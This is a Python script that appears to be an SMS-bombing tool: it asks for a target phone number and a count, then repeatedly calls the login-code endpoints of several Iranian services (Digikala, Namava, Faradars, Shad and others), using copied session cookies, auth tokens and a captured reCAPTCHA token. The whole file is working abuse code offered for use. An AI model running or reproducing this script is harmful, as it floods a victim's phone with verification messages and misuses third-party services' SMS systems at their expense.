import requests
import os


os.system('cmd /c "color 2"')
os.system('cmd /c "cls"')
Phone_NOMBER = input("Enter Nomber For Hack : ")
SMS = input("\n\nEnter Nomber Send SMS : ")
for i in range(int(int(SMS))):
    #     ############################### شبدیز ###############################
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://www.shabdizgroup.com/',
        'Origin': 'https://www.shabdizgroup.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    params = {
        'phoneNumber': Phone_NOMBER,
    }

    response = requests.get('https://paneladmin.shabdizgroup.com/api/App/RequestVerifyCode', params=params, headers=headers)
    print(response)
    #     ############################### پیتزاخونه ###############################
    cookies = {
        'v_referrer': 'www.google.com',
        'v_url': '%2F',
        'BasketID': '100074786',
        'checkTextTrnslateLan': 'fa',
        '_ga_SC3D0MQHEV': 'GS1.1.1716378187.2.0.1716378187.0.0.0',
        '_ga': 'GA1.1.1097643944.1715860612',
        'wm1400': 'CfDJ8CzQN8tpNoNCvvgACeR3CydyRo-rcxe3JP4C_5zjjctzpMHJoscZXrVUlPMao3-PWVGX2cEiaP_avR70KhCnmeSruCgKobV8E2JfwHpJFtXsiMqp7W_KJglDH7v02cJzqlXjfV3xZ8THTQ3qXUkgjV1os1MKAh_9ixQmFgYofFLO',
        'timeZone': '',
        '2B05B3EB661CC9C49775D608B6AE9B7B8BF53585': 'C754A3E95750A5A7FA5AFC0D4E1614815B036C43',
        '.AspNetCore.Antiforgery.LcR2uivWBag': 'CfDJ8CzQN8tpNoNCvvgACeR3CyeygoAnzctK0jrtIyAM3N9YJFVot9CNqlqX6SVhYPMr8utjatI04SYaxdIUCgPXqByqUZbce890QzGklcVcB7xkmj4leuAdzN9zG9uPYNENMx2STJqqvRKyc6NzUB-UJ5Y',
        '.AspNetCore.Session': 'CfDJ8CzQN8tpNoNCvvgACeR3Cyf33g1WgfEM7LUc92nq6lh5U5Pu%2BKz7ZA6LgRoeNmLdhddvMxe7H8Wu1HlMZFLctnvr47%2B%2FL8BmMJLWD8iX5cDYvBT3jd5RRaNt71c4x3jiJboLCUoTjF4azGTlu8vITh8OkEpqfcTZVVsb6NUukM6v',
        'F365A98FEE31CB95CC9974DF1E9853C762754323': 'B8925A382B7A4F5C2620B2E31781A0227EFA1994',
        'dishSeparateKind': '1',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://pitzakhooneh.ir',
        'Connection': 'keep-alive',
        'Referer': 'https://pitzakhooneh.ir/',
        # 'Cookie': 'v_referrer=www.google.com; v_url=%2F; BasketID=100074786; checkTextTrnslateLan=fa; _ga_SC3D0MQHEV=GS1.1.1716378187.2.0.1716378187.0.0.0; _ga=GA1.1.1097643944.1715860612; wm1400=CfDJ8CzQN8tpNoNCvvgACeR3CydyRo-rcxe3JP4C_5zjjctzpMHJoscZXrVUlPMao3-PWVGX2cEiaP_avR70KhCnmeSruCgKobV8E2JfwHpJFtXsiMqp7W_KJglDH7v02cJzqlXjfV3xZ8THTQ3qXUkgjV1os1MKAh_9ixQmFgYofFLO; timeZone=; 2B05B3EB661CC9C49775D608B6AE9B7B8BF53585=C754A3E95750A5A7FA5AFC0D4E1614815B036C43; .AspNetCore.Antiforgery.LcR2uivWBag=CfDJ8CzQN8tpNoNCvvgACeR3CyeygoAnzctK0jrtIyAM3N9YJFVot9CNqlqX6SVhYPMr8utjatI04SYaxdIUCgPXqByqUZbce890QzGklcVcB7xkmj4leuAdzN9zG9uPYNENMx2STJqqvRKyc6NzUB-UJ5Y; .AspNetCore.Session=CfDJ8CzQN8tpNoNCvvgACeR3Cyf33g1WgfEM7LUc92nq6lh5U5Pu%2BKz7ZA6LgRoeNmLdhddvMxe7H8Wu1HlMZFLctnvr47%2B%2FL8BmMJLWD8iX5cDYvBT3jd5RRaNt71c4x3jiJboLCUoTjF4azGTlu8vITh8OkEpqfcTZVVsb6NUukM6v; F365A98FEE31CB95CC9974DF1E9853C762754323=B8925A382B7A4F5C2620B2E31781A0227EFA1994; dishSeparateKind=1',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    params = {
        'lazyLoad': 'true',
        'btnID': 'undefined',
    }

    data = {
        'PhoneNumber': Phone_NOMBER,
        'call': 'false',
        'data1': '38881cf8-35f0-4743-ab33-c9975a6e56c9',
        'data2': '638519875736753156',
        'ForgetPass': 'false',
    }

    response = requests.post(
        'https://pitzakhooneh.ir/Account/FoodPhoneNumberVerification/',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
    print(response)
    #     ############################### دیجی کالا ###############################
    cookies = {
        '_sp_ses.13cb': '*',
        '_sp_id.13cb': '61e94fa0-5aa7-4285-9b6f-ce4b803ce271.1716379964.1.1716379977..e384d6ca-b1db-4721-830a-cfdcd7b8ce4e..ceb21d11-1f69-4c9a-9d4e-f8f1a7c97321.1716379963875.10',
        'tracker_glob_new': 'ciewu5l',
        'tracker_session': '67dWL5g',
        'TS01c77ebf': '0102310591f244d51ddc52bfd04667750d1f725ffd622e78cfa9e082d3bb09fcb31428e5deb0c512ef587fd539eb24356a941d0f3a809ae9595f99fda20f00ab669f9cf59b',
        'TS01b6ea4d': '01023105919be6b3f1260381dd1528074f4c53f743622e78cfa9e082d3bb09fcb31428e5defbcb1143435583a505556ef8f47251de02233d5f52e4ec5bc17f030546505439cff876c305d5eb3c387948c931aeaa0c',
        'ab_test_experiments': '%5B%228b29e3376be23005993b066a7741e54e%22%2C%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22ce9358448bd487c71527b7c18d634fd1%22%2C%22e9ade66cadf2633c074b2cee1e403034%22%5D',
        '_ga_QQKVTD5TG8': 'GS1.1.1716379968.1.1.1716379978.0.0.0',
        '_ga': 'GA1.1.1878235439.1716379968',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'Referer': 'https://www.digikala.com/',
        'X-Web-Optimize-Response': '1',
        'X-Web-Client': 'desktop',
        'Origin': 'https://www.digikala.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Connection': 'keep-alive',
        # 'Cookie': '_sp_ses.13cb=*; _sp_id.13cb=61e94fa0-5aa7-4285-9b6f-ce4b803ce271.1716379964.1.1716379977..e384d6ca-b1db-4721-830a-cfdcd7b8ce4e..ceb21d11-1f69-4c9a-9d4e-f8f1a7c97321.1716379963875.10; tracker_glob_new=ciewu5l; tracker_session=67dWL5g; TS01c77ebf=0102310591f244d51ddc52bfd04667750d1f725ffd622e78cfa9e082d3bb09fcb31428e5deb0c512ef587fd539eb24356a941d0f3a809ae9595f99fda20f00ab669f9cf59b; TS01b6ea4d=01023105919be6b3f1260381dd1528074f4c53f743622e78cfa9e082d3bb09fcb31428e5defbcb1143435583a505556ef8f47251de02233d5f52e4ec5bc17f030546505439cff876c305d5eb3c387948c931aeaa0c; ab_test_experiments=%5B%228b29e3376be23005993b066a7741e54e%22%2C%22229ea1a233356b114984cf9fa2ecd3ff%22%2C%22ce9358448bd487c71527b7c18d634fd1%22%2C%22e9ade66cadf2633c074b2cee1e403034%22%5D; _ga_QQKVTD5TG8=GS1.1.1716379968.1.1.1716379978.0.0.0; _ga=GA1.1.1878235439.1716379968',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    json_data = {
        'backUrl': '/',
        'username': Phone_NOMBER,
        'otp_call': False,
    }

    response = requests.post('https://api.digikala.com/v1/user/authenticate/', cookies=cookies, headers=headers, json=json_data)
    print(response)
    #     ############################### فرادرس ###############################
    cookies = {
        '_ga_MCXYH70MBX': 'GS1.1.1716381662.1.1.1716381703.0.0.0',
        '_ga': 'GA1.2.8330733.1716381663',
        '_ga_1SSNSBRK00': 'GS1.1.1716381663.1.1.1716381703.0.0.0',
        '_clck': '1uxxq72%7C2%7Cflz%7C0%7C1603',
        '_clsk': 'qhq9gz%7C1716381703881%7C3%7C1%7Cz.clarity.ms%2Fcollect',
        'laravel_session': 'eyJpdiI6InRpZUVuTmFib0VoOEZNL1VhV2l4cFE9PSIsInZhbHVlIjoiMzV3UjdrNzhFTW1WVmVobUZWMXgvd2ljdHI2eXZBdzlEd09BYlVXM1AydTd0QzdpSk9HMW0zcy9nZFRWZnV6clAxM3dmbWNEWVIwWCtIUSs4dENwWkJSTEZsOUVZUUllTVF3Vmk1emdXS3pIOGp0V3M1RjhDdkk4cTNBOUVTZ3YiLCJtYWMiOiI2NGE1YzRmNjVjZWQyOTI1M2NjNTkyNjkzNTA1NGMyMmVlYjJmNDdhNmVmNzYzODU3MzQ1NzdlMDU4M2ZmMzYzIiwidGFnIjoiIn0%3D',
        'fara_dars_guest_shopping_cart_04a036a898e2a750d91742f88b2d8599': 'Yk5XNTgwL21sVHlYSFpOY3pSOVhBazdqbkY0S3Ntc3M2cGJrZnRmRm1CU2dIbTBCVkM4a3A5OFZNQUhBc1FHWQ%3D%3D',
        '_gid': 'GA1.2.789109954.1716381702',
        '_gat_gtag_UA_50789780_1': '1',
        '_hjSessionUser_3638482': 'eyJpZCI6ImUzNTQzZTQzLTZjYzQtNWY2Ny04ZTBmLTA3NWZjZTY5MjA0NiIsImNyZWF0ZWQiOjE3MTYzODE3MDQ2MzAsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjSession_3638482': 'eyJpZCI6IjU4NGUwNzRjLWM4YTktNDhjZS1iZmQ5LTNiYWI5Y2Y4NDc1YiIsImMiOjE3MTYzODE3MDQ2MzEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
        'Accept': 'application/json',
        'Accept-Language': 'fa',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'Nextjs': 'true',
        'Current-Url': 'https://faradars.org/register',
        'Origin': 'https://faradars.org',
        'Connection': 'keep-alive',
        'Referer': 'https://faradars.org/',
        # 'Cookie': '_ga_MCXYH70MBX=GS1.1.1716381662.1.1.1716381703.0.0.0; _ga=GA1.2.8330733.1716381663; _ga_1SSNSBRK00=GS1.1.1716381663.1.1.1716381703.0.0.0; _clck=1uxxq72%7C2%7Cflz%7C0%7C1603; _clsk=qhq9gz%7C1716381703881%7C3%7C1%7Cz.clarity.ms%2Fcollect; laravel_session=eyJpdiI6InRpZUVuTmFib0VoOEZNL1VhV2l4cFE9PSIsInZhbHVlIjoiMzV3UjdrNzhFTW1WVmVobUZWMXgvd2ljdHI2eXZBdzlEd09BYlVXM1AydTd0QzdpSk9HMW0zcy9nZFRWZnV6clAxM3dmbWNEWVIwWCtIUSs4dENwWkJSTEZsOUVZUUllTVF3Vmk1emdXS3pIOGp0V3M1RjhDdkk4cTNBOUVTZ3YiLCJtYWMiOiI2NGE1YzRmNjVjZWQyOTI1M2NjNTkyNjkzNTA1NGMyMmVlYjJmNDdhNmVmNzYzODU3MzQ1NzdlMDU4M2ZmMzYzIiwidGFnIjoiIn0%3D; fara_dars_guest_shopping_cart_04a036a898e2a750d91742f88b2d8599=Yk5XNTgwL21sVHlYSFpOY3pSOVhBazdqbkY0S3Ntc3M2cGJrZnRmRm1CU2dIbTBCVkM4a3A5OFZNQUhBc1FHWQ%3D%3D; _gid=GA1.2.789109954.1716381702; _gat_gtag_UA_50789780_1=1; _hjSessionUser_3638482=eyJpZCI6ImUzNTQzZTQzLTZjYzQtNWY2Ny04ZTBmLTA3NWZjZTY5MjA0NiIsImNyZWF0ZWQiOjE3MTYzODE3MDQ2MzAsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_3638482=eyJpZCI6IjU4NGUwNzRjLWM4YTktNDhjZS1iZmQ5LTNiYWI5Y2Y4NDc1YiIsImMiOjE3MTYzODE3MDQ2MzEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    json_data = {
        'mobile': Phone_NOMBER,
        'g-recaptcha-response-v3': '03AFcWeA7KhJEAQjyWzwyTbSyYR52rJMJgXekgy2U-8-cUVZIYt2mDcOALct9r5D7iTb7vqbtw1RKSZstIkf8FEAOMj9hVTp18oEnnRA87sa1_ky3BLwnA8MPLOmNLjlFdy2Hjqj53LMnP5zWIdIq1WphjibicA5krlxGAyb2pTkZ_qNfT-lF4UiZU38N0Vsd8Vqdg1kJUaDGVkXSj_6BvJTB-IgQmFTxk3YaRrKfQTtrvKjkKPuOn5daqOSvHv3_UE5CPOcUV4_0gjAiRrlsF-l9hKkdSFH_BmbL166WFRaTXHKASE0Qnd5rBdzJZHs_CDK7-xa6_Ym-jN2dlA5NqDUyjowtNOEY6zSEFDIMlx8LkR_ObH8AEbpXo_JsUUjVS16hqgqgJl4Cdzn4iXQfM_Ha5PUQqO_WljYfbdsbD9vb9yEuH7CE1XybP7VNTUF0yIB_lcaSlI0CJxPF5rFuNQUNgUvGvYQFsN-p-LGJBD_rnT8zXxwvakkoh_cxmB3K6fWOaNTQ05yKSGSc2n07nKVDF8pzIhvTfFAFU3QMqjy0Oh-1werTscoeJPDa3POh1BuT4-uzXj-JVtdR7ZIXZTYkWyhi7ontIa6jVXbAbZ3PbnqB-BJhvMDbHRHD3sfPM0zRjQRuHKZFsUOLMIEAxB33jzf5Z9QQo8Q',
        'digits': 5,
        'platforms': 'web',
        'source': 'faradars',
    }

    response = requests.post('https://api.faradars.org/api/client/v1/auth/otp', cookies=cookies, headers=headers, json=json_data)
    print(response)
    #     ############################### نماوا ###############################
    cookies = {
        'use_legacy_player': 'false',
        'dv-v3': '{"g":"desktop","platform":null}',
        'guest_token': '0368F2A8BCFEFFEDF881E8B1D7B63F7C2E270B1BC6D84C21661AFCAACD87611963C159B9D9F97999F097A2012431CFA1F571E927A860B13EBD619FBBB9A15D7192B4EB7427DE1631BBA7B6E18CBF1410ED8DFA9548CA1F6B8F205BECD8123B704B483EF87AC52EC5DA4E913A994DD69AADAA10BE14561A60B8CD21663B1F86E20B987FFFB04E76E4880D6EC4F58531038393E65B8F1E1276D45C1A39B1CD09CAF91C995AFA26350A1AA66B921174B90E09F8A3F4DCABB7FFC19140E1C0F62BEE1E669BB3E65059664CF0FF710BB85EBC75750D82D76C697595302196117A90A1F317B4EDD6CE757DA7A1D9BC1C5D3642062096E5FF97E76D0DE6B7C4187ECBB5',
        'anonymous_login': 'true',
        '_clck': '3i1wnq%7C2%7Cflz%7C0%7C1603',
        '_ga': 'GA1.2.15020820.1716382006',
        '_gid': 'GA1.2.343377359.1716382006',
        'analytics_session_token': '7a7972f5-83c4-9df7-8d34-803934ea2b69',
        'analytics_token': 'e24f424b-f88f-957b-c1d4-b76a251e506c',
        'yektanet_session_last_activity': '5/22/2024',
        '_yngt_iframe': '1',
        '_ga_9XXJ5QGRKG': 'GS1.2.1716382007.1.1.1716382312.31.0.0',
        '_yngt': 'a7f00977-71cf2-24d3f-f1766-6f8787595a1aa',
        '_ga_X8RD5LS5K2': 'GS1.1.1716382009.1.1.1716382303.0.0.0',
        '_clsk': '15384v8%7C1716382303413%7C4%7C1%7Cwww.clarity.ms%2Feus2-c%2Fcollect',
        'auth_nounce': 'YWENFvF1pH5DZkt3lvJ_c1ezUjGfyF1zaLUNvAh2t-rXDDDBi26VKUbji7yLTLLP2btkbVMigz55ACbxIpWMAA2',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json;charset=utf-8',
        'X-Application-Type': 'WebClient',
        'X-Client-Version': '2.64.0',
        'X-Auth-Token': '0368F2A8BCFEFFEDF881E8B1D7B63F7C2E270B1BC6D84C21661AFCAACD87611963C159B9D9F97999F097A2012431CFA1F571E927A860B13EBD619FBBB9A15D7192B4EB7427DE1631BBA7B6E18CBF1410ED8DFA9548CA1F6B8F205BECD8123B704B483EF87AC52EC5DA4E913A994DD69AADAA10BE14561A60B8CD21663B1F86E20B987FFFB04E76E4880D6EC4F58531038393E65B8F1E1276D45C1A39B1CD09CAF91C995AFA26350A1AA66B921174B90E09F8A3F4DCABB7FFC19140E1C0F62BEE1E669BB3E65059664CF0FF710BB85EBC75750D82D76C697595302196117A90A1F317B4EDD6CE757DA7A1D9BC1C5D3642062096E5FF97E76D0DE6B7C4187ECBB5',
        'Origin': 'https://www.namava.ir',
        'Connection': 'keep-alive',
        'Referer': 'https://www.namava.ir/auth/register-phone',
        # 'Cookie': 'use_legacy_player=false; dv-v3={"g":"desktop","platform":null}; guest_token=0368F2A8BCFEFFEDF881E8B1D7B63F7C2E270B1BC6D84C21661AFCAACD87611963C159B9D9F97999F097A2012431CFA1F571E927A860B13EBD619FBBB9A15D7192B4EB7427DE1631BBA7B6E18CBF1410ED8DFA9548CA1F6B8F205BECD8123B704B483EF87AC52EC5DA4E913A994DD69AADAA10BE14561A60B8CD21663B1F86E20B987FFFB04E76E4880D6EC4F58531038393E65B8F1E1276D45C1A39B1CD09CAF91C995AFA26350A1AA66B921174B90E09F8A3F4DCABB7FFC19140E1C0F62BEE1E669BB3E65059664CF0FF710BB85EBC75750D82D76C697595302196117A90A1F317B4EDD6CE757DA7A1D9BC1C5D3642062096E5FF97E76D0DE6B7C4187ECBB5; anonymous_login=true; _clck=3i1wnq%7C2%7Cflz%7C0%7C1603; _ga=GA1.2.15020820.1716382006; _gid=GA1.2.343377359.1716382006; analytics_session_token=7a7972f5-83c4-9df7-8d34-803934ea2b69; analytics_token=e24f424b-f88f-957b-c1d4-b76a251e506c; yektanet_session_last_activity=5/22/2024; _yngt_iframe=1; _ga_9XXJ5QGRKG=GS1.2.1716382007.1.1.1716382312.31.0.0; _yngt=a7f00977-71cf2-24d3f-f1766-6f8787595a1aa; _ga_X8RD5LS5K2=GS1.1.1716382009.1.1.1716382303.0.0.0; _clsk=15384v8%7C1716382303413%7C4%7C1%7Cwww.clarity.ms%2Feus2-c%2Fcollect; auth_nounce=YWENFvF1pH5DZkt3lvJ_c1ezUjGfyF1zaLUNvAh2t-rXDDDBi26VKUbji7yLTLLP2btkbVMigz55ACbxIpWMAA2',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }

    json_data = {
        'UserName': "+98"+Phone_NOMBER[1:],
    }

    response = requests.post(
        'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    print(response)
    #     ############################### شاد ###############################
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'text/plain',
        'Origin': 'https://web.shad.ir',
        'Connection': 'keep-alive',
        'Referer': 'https://web.shad.ir/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
    }

    data = '{"api_version":"6","tmp_session":"guwovkphztlnmaotneuuxblzzwgjqfdj","data_enc":"4Boy+5i94+/ioca/lmiVX4eWPpDa619Q8ikFsg9PXKFsRnRXqKsP1MpO7iDusK2aT4HI2yZ2kqTtiXmyg0hFBvUHVuTPMtaEkgsZBg9JaqKK3lQqgGY/kS0Ydm96ebrfGX84EytlxXr3eRGgxxDSUJ17Thke8SZluIrWB5ssO/Ys21y2VsQHV+5K0qvuDWew9YPPRnl6ElsDRYtyv1LGgn2ChLHBx94k3DGAv7rRQ/Il6gGSj9lSI/zKIxjG/OIB"}'

    response = requests.post('https://shadmessenger16.iranlms.ir/', headers=headers, data=data)
    print(response)


    print("\nNEXT...\n")